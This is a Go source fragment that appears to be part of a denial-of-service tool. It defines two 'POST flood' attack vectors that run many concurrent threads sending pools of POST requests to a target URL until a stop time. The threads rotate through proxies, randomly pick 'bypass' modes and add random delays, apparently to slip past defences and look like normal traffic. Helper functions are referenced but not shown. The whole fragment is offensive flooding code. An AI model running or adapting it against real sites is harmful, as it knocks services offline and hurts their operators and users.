package main

import (
	"fmt"
	mrand "math/rand"
	"net/http"
	"sync"
	"time"
)

func executeHeavyPost() {
	fmt.Printf("[VECTOR] HEAVY POST Flood\n")
	var wg sync.WaitGroup
	for i := 0; i < cfg.threadCount; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			rng := mrand.New(mrand.NewSource(time.Now().UnixNano() + int64(id)))
			proxy := ""
			client := newDirectClient()
			if cfg.useProxy {
				proxy = getNextProxy()
				client = getProxyClient(proxy)
			}
			for time.Now().Before(stopTime) {
				if cfg.useProxy {
					proxy = getNextProxy()
					client = getProxyClient(proxy)
				}
				reqPool := make([]*http.Request, POOL_SIZE_POST)
				for p := 0; p < len(reqPool); p++ {
					bypass := 1
					if rng.Intn(4) == 0 {
						bypass = 2
					}
					reqPool[p], _ = buildRequest("POST", targetURL, true, bypass)
				}
				for j := 0; j < len(reqPool) && time.Now().Before(stopTime); j++ {
					doRequest(client, reqPool[j])
				}
				time.Sleep(randomThinkTime())
			}
		}(i)
	}
	wg.Wait()
}

func executeMixVectorPost(threadCount int) {
	var wg sync.WaitGroup
	for i := 0; i < threadCount; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			rng := mrand.New(mrand.NewSource(time.Now().UnixNano() + int64(id)))
			proxy := ""
			client := newDirectClient()
			if cfg.useProxy {
				proxy = getNextProxy()
				client = getProxyClient(proxy)
			}
			for time.Now().Before(stopTime) {
				if cfg.useProxy {
					proxy = getNextProxy()
					client = getProxyClient(proxy)
				}
				reqPool := make([]*http.Request, POOL_SIZE_POST)
				for p := 0; p < len(reqPool); p++ {
					bypass := 1
					if rng.Intn(3) == 0 {
						bypass = 2
					}
					reqPool[p], _ = buildRequest("POST", targetURL, true, bypass)
				}
				for j := 0; j < len(reqPool) && time.Now().Before(stopTime); j++ {
					doRequest(client, reqPool[j])
				}
				time.Sleep(randomThinkTime())
			}
		}(i)
	}
	wg.Wait()
}
